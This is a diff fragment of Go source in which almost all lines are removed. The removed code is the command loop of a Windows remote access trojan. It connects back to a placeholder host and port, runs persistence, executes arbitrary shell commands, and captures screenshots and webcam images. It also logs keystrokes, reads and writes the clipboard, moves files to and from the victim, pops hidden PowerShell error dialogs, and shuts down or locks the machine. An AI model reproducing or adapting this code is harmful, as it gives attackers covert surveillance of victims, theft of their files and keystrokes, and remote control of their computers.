-		syscall.SetFileAttributes(pathPtr, syscall.FILE_ATTRIBUTE_HIDDEN)
-
-		setWallpaper(pathPtr)
-		time.Sleep(time.Second)
-		os.Remove(path)
-	}
-}
-
-func compress(data []byte) []byte {
-	var buff bytes.Buffer
-
-	writer, _ := xz.NewWriter(&buff)
-	writer.Write(data)
-	writer.Close()
-
-	return buff.Bytes()
-}
-
-func decompress(data []byte) []byte {
-	var buff bytes.Buffer
-
-	reader, _ := xz.NewReader(bytes.NewReader(data))
-	buff.ReadFrom(reader)
-
-	return buff.Bytes()
-}
-
-func main() {
-	persist()
-	GetInfo()
-	for {
-		if active {
-			command, err := System.reader.ReadString('\n')
-			if err != nil {
-				System.conn.Close()
-				active = false
-			}
-			switch strings.TrimSpace(command) {
-			case "\x01":
-				fetchData()
-
-			case "\x02":
-				method, err := System.reader.ReadString('\n')
-				if err != nil {
-					System.conn.Close()
-					active = false
-				}
-
-				method = strings.TrimSpace(method)
-				if method == "1" {
-					writeResponse("<SHARE>")
-					streaming = true
-					go stream()
-				} else {
-					streaming = false
-				}
-
-			case "\x03":
-				url, err := System.reader.ReadString('\n')
-				if err != nil {
-					System.conn.Close()
-					active = false
-				}
-
-				exec.Command("rundll32.exe", "url.dll,FileProtocolHandler", strings.TrimSpace(url)).Start()
-
-			case "\x04":
-				command, err := System.reader.ReadString('\n')
-				if err != nil {
-					System.conn.Close()
-					active = false
-				}
-
-				writeResponse("<START>")
-				writeResponse(run(command))
-				writeResponse("<END>")
-
-			case "\x05":
-				method, err := System.reader.ReadString('\n')
-				if err != nil {
-					System.conn.Close()
-					active = false
-				}
-
-				method = strings.TrimSpace(method)
-				if method == "1" {
-					content, err := System.reader.ReadString('\n')
-					if err != nil {
-						System.conn.Close()
-						active = false
-					}
-
-					clipboard.WriteAll(content)
-				} else {
-					content, _ := clipboard.ReadAll()
-					writeResponse("<START>")
-					writeResponse(content)
-					writeResponse("<END>")
-				}
-
-			case "\x06":
-				title, err := System.reader.ReadString('\n')
-				if err != nil {
-					System.conn.Close()
-					active = false
-				}
-
-				message, err := System.reader.ReadString('\n')
-				if err != nil {
-					System.conn.Close()
-					active = false
-				}
-
-				notification := fmt.Sprintf("Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show(\"%v\", \"%v\", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)", message, title)
-				cmd := exec.Command("powershell.exe", "/c", notification)
-				cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-				cmd.Start()
-
-			case "\x07":
-				appid, err := System.reader.ReadString('\n')
-				if err != nil {
-					System.conn.Close()
-					active = false
-				}
-				title, err := System.reader.ReadString('\n')
-				if err != nil {
-					System.conn.Close()
-					active = false
-				}
-				message, err := System.reader.ReadString('\n')
-				if err != nil {
-					System.conn.Close()
-					active = false
-				}
-				go notify(appid, title, message)
-
-			case "\x08":
-				writeResponse("<SCREEN>")
-				img, _ := screenshot.CaptureDisplay(0)
-				jpeg.Encode(System.conn, img, nil)
-
-			case "\x16":
-				method, err := System.reader.ReadString('\n')
-				if err != nil {
-					System.conn.Close()
-					active = false
-				}
-
-				method = strings.TrimSpace(method)
-				if method == "1" {
-					writeResponse("<SHARE>")
-					streaming = true
-					go streamCam()
-				} else {
-					streaming = false
-				}
-
-			case "\x17":
-				writeResponse("<SCREEN>")
-				camera, err := gocv.OpenVideoCapture(0)
-				if err == nil {
-					defer camera.Close()
-					frame := gocv.NewMat()
-					defer frame.Close()
-					camera.Read(&frame)
-					img, _ := frame.ToImage()
-					jpeg.Encode(System.conn, img, nil)
-
-				}
-
-			case "":
-				method, err := System.reader.ReadString('\n')
-				if err != nil {
-					System.conn.Close()
-					active = false
-				}
-
-				method = strings.TrimSpace(method)
-				if method == "1" && !logging {
-					go listenKeystrokes(true)
-				} else if logging {
-					logging = false
-					writeResponse("<LOG>")
-					writeResponse(LOG.String())
-					writeResponse("<END>")
-					LOG.Reset()
-				}
-
-			case "\x10":
-				exec.Command("cmd.exe", "/c", "shutdown /s /t 0").Start()
-
-			case "\x11":
-				exec.Command("cmd.exe", "/c", "shutdown /r /t 0").Start()
-
-			case "\x12":
-				exec.Command("rundll32.exe", "user32.dll,LockWorkStation").Start()
-
-			case "\x13":
-				path, err := System.reader.ReadString('\n')
-				if err != nil {
-					System.conn.Close()
-					active = false
-				}
-
-				data, err := os.ReadFile(strings.TrimSpace(path))
-				if err == nil {
-					writeResponse("<DOWNLOAD>")
-					writeResponse(string(compress(data)))
-					writeResponse("<END>")
-				}
-
-			case "\x14":
-				var DATA strings.Builder
-				filename, err := System.reader.ReadString('\n')
-				if err != nil {
-					System.conn.Close()
-					active = false
-				}
-
-				for {
-					data, err := System.reader.ReadString('\n')
-					if err != nil {
-						System.conn.Close()
-						active = false
-					}
-					if strings.TrimSpace(data) == "<END>" {
-						break
-					}
-					DATA.WriteString(data)
-				}
-				os.WriteFile(strings.TrimSpace(filename), decompress([]byte(DATA.String())), 0644)
-
-			case "\x15":
-				path, err := System.reader.ReadString('\n')
-				if err != nil {
-					System.conn.Close()
-					active = false
-				}
-				go getWallpaper(strings.TrimSpace(path))
-			}
-
-			time.Sleep(time.Millisecond * 200)
-		} else {
-			connectToServer("<HOST>", <PORT>)
-		}
-	}
+	return string(out)
 }
